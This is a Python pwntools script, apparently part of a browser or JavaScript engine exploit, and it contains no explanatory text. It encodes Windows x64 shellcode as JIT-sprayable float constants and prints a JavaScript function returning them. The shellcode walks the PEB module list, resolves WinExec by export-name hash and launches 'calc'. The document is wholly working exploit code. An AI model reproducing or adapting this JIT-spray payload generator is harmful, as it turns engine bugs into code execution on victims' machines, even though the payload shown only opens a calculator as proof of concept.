from pwn import *
import struct

context(arch='amd64')
jmp = b'\xeb\x0c'
jmp2 = b'\xeb\x0f'
calc = u64(b'calc\x00\x00\x00\x00')

values = []

def make_double(code):
    assert len(code) <= 6
    hex_value = hex(u64(code.ljust(6, b'\x90') + jmp))[2:]
    double_value = struct.unpack('!d', bytes.fromhex(hex_value.rjust(16, '0')))[0]
    values.append(double_value)

def make_double2(code):
    assert len(code) <= 6
    hex_value = hex(u64(code.ljust(6, b'\x90') + jmp2))[2:]
    double_value = struct.unpack('!d', bytes.fromhex(hex_value.rjust(16, '0')))[0]
    values.append(double_value)

#start
make_double(asm("nop;"))
make_double(asm("add ebx,0x60;"))
make_double(asm("mov r8,qword ptr gs:[rbx];")) 
make_double(asm("mov rdi,qword ptr [r8+0x18];"))
make_double(asm("mov rdi,qword ptr [rdi+0x30];"))
make_double(asm("xor rcx, rcx;"))
make_double(asm("mov dl, 0x4b;"))

#next_module
make_double(asm("mov rax,qword ptr [rdi+0x10];"))
make_double(asm("mov rsi,qword ptr [rdi+0x40];"))
make_double(asm("mov rdi,qword ptr [rdi];"))
make_double(asm("cmp [rsi+12*2], cx ;"))
make_double(asm(".byte 0x75, 0xae;"))  
make_double(asm(".byte 0xe9,0x14,0x03,0x00,0x00;"))  

#lookup_func:
make_double(asm("mov ebx, [rdi + 0x3c];"))
make_double(asm("add ebx, 0x88;"))
make_double(asm("add rbx, rdi;"))
make_double2(asm("mov eax, [rbx];"))
make_double2(asm("mov rbx, rdi;"))
make_double2(asm("add rbx,rax;"))
make_double2(asm("mov eax, [rbx + 0x20];")) 
make_double2(asm("mov r8, rdi;"))
make_double2(asm("add r8, rax;"))
make_double2(asm("mov ecx, [rbx + 0x18];"))

#check_names:
make_double2(asm("dec ecx;"))
make_double2(asm("mov eax, [r8 + rcx * 4];"))
make_double2(asm("mov rsi, rdi;"))
make_double2(asm("add rsi, rax;"))
make_double2(asm("xor r9, r9;"))
make_double2(asm("xor rax, rax;"))
make_double2(asm("cld;"))

#calc_hash
make_double2(asm("lodsb;"))  
make_double2(asm("test al,al;"))
make_double2(asm(".byte 0x74,0x5A;"))
make_double2(asm("ror r9d, 0x0d;"))
make_double2(asm("add r9, rax;"))
make_double2(asm(".byte 0xeb,0x8b;")) 

#calc_finished
make_double2(asm("cmp r9d,edx;"))     
make_double2(asm("nop;")) # 	
make_double2(asm(".byte 0x0f,0x85,0xa1,0xfe,0xff,0xff;")) 

#find_addr
make_double2(asm("mov r8d, [rbx + 0x24];"))      
make_double2(asm("add r8,rdi;"))
make_double2(asm("mov ax, [r8 + rcx * 2];"))
make_double2(asm("mov r8d, [rbx + 0x1c];"))  
make_double2(asm("lea r8, [r8 + rdi];")) 
make_double2(asm("mov eax, [r8 + rax * 4];"))
make_double2(asm("add rax, rdi;"))

#found_func
make_double2(asm("ret;"))     

#locate_funcs: 
make_double2(asm("mov rdi, rax;"))   
make_double2(asm("sub rsp, 0x10;"))    
make_double2(asm("mov r15, rsp;"))  

#locate_winexec:
make_double2(asm("mov edx,0xe8afe98"))
make_double2(asm(".byte 0xe8, 0x9a, 0xfc,0xff,0xff;"))  

#call_winexec
make_double2(asm("push %d; pop rcx;" % (calc >> 0x20)))
make_double2(asm("push %d; pop rdx;" % (calc % 0x100000000)))
make_double2(asm("shl rcx, 0x20;"))
make_double2(asm("add rcx,rdx;xor rdx,rdx;"))
make_double2(asm("push rcx;"))
make_double2(asm("mov rcx,rsp;"))
code = asm("inc rdx;call rax")
assert len(code) <= 8
hex_value = hex(u64(code.ljust(8, b'\x90')))[2:]
double_value = struct.unpack('!d', bytes.fromhex(hex_value.rjust(16, '0')))[0]
values.append(double_value)

js_function = f'''
function func() {{
  return [{', '.join(map(str, values))}];
}}
'''

print(js_function)
